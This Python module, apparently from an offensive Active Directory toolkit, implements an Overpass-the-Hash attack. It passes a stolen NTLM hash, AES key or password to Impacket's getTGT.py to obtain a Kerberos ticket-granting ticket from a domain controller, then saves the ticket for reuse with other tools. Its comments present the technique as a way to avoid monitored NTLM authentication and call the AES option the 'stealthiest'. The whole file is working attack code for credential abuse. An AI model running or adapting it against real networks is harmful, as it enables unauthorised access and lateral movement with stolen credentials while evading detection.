"""
Overpass-the-Hash — Convert NTLM hash/AES key into a Kerberos TGT.

This is the Kerberos equivalent of Pass-the-Hash. Instead of using
NTLM auth (monitored), we request a legitimate Kerberos TGT using
the hash as the key.

Result: A valid .ccache file usable with any Kerberos-aware tool
(Impacket, CrackMapExec, etc.)
"""

import os
import subprocess
from pathlib import Path
from typing import List

from ..utils.ticket_utils import TicketInspector
from ..utils.commands import CommandReference


class OverpassTheHash:
    """Convert NTLM hash or AES key into a Kerberos TGT."""

    def __init__(self, domain: str, dc_ip: str, output_dir: Path):
        self.domain = domain
        self.dc_ip = dc_ip
        self.output_dir = output_dir

    def execute(
        self,
        username: str,
        ntlm_hash: str = "",
        aes256_key: str = "",
        password: str = "",
    ) -> str:
        """
        Request a TGT using hash/password via getTGT.py.

        Returns the path to the .ccache file on success, empty string on failure.
        """
        print(f"\n{'=' * 60}")
        print("OVERPASS-THE-HASH (NTLM Hash → Kerberos TGT)")
        print(f"{'=' * 60}")
        print(f"[*] Target user: {self.domain}\\{username}")

        ccache_file = str(self.output_dir / f"{username}.ccache")
        cmd = self._build_command(username, ntlm_hash, aes256_key, password)

        if not cmd:
            print("[-] Need password, NTLM hash, or AES key")
            return ""

        env = os.environ.copy()
        env["KRB5CCNAME"] = ccache_file

        try:
            print(f"[*] Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30, env=env
            )

            # getTGT.py saves to <username>.ccache in cwd by default
            default_ccache = f"{username}.ccache"
            if os.path.exists(default_ccache):
                os.rename(default_ccache, ccache_file)

            if os.path.exists(ccache_file):
                print(f"[+] TGT saved to: {ccache_file}")
                print(f"[+] Use with: export KRB5CCNAME={ccache_file}")
                TicketInspector.print_info(ccache_file)
                return ccache_file

            print("[-] TGT request failed")
            if result.stderr:
                print(f"    Error: {result.stderr[:300]}")
            return ""

        except FileNotFoundError:
            print("[-] getTGT.py not found")
            CommandReference.print_opth_alternatives(
                self.domain, self.dc_ip, username, ntlm_hash, aes256_key
            )
            return ""
        except Exception as e:
            print(f"[-] Overpass-the-Hash failed: {e}")
            return ""

    def _build_command(
        self, username: str, ntlm_hash: str,
        aes256_key: str, password: str,
    ) -> List[str]:
        """Build the getTGT.py command line."""
        cmd = ["getTGT.py"]

        if aes256_key:
            cmd += [f"{self.domain}/{username}", "-aesKey", aes256_key]
            print("[*] Using AES256 key (stealthiest — no RC4 downgrade)")
        elif ntlm_hash:
            cmd += [f"{self.domain}/{username}", "-hashes", f":{ntlm_hash}"]
            print("[*] Using NTLM hash")
        elif password:
            cmd += [f"{self.domain}/{username}:{password}"]
            print("[*] Using password")
        else:
            return []

        cmd += ["-dc-ip", self.dc_ip]
        return cmd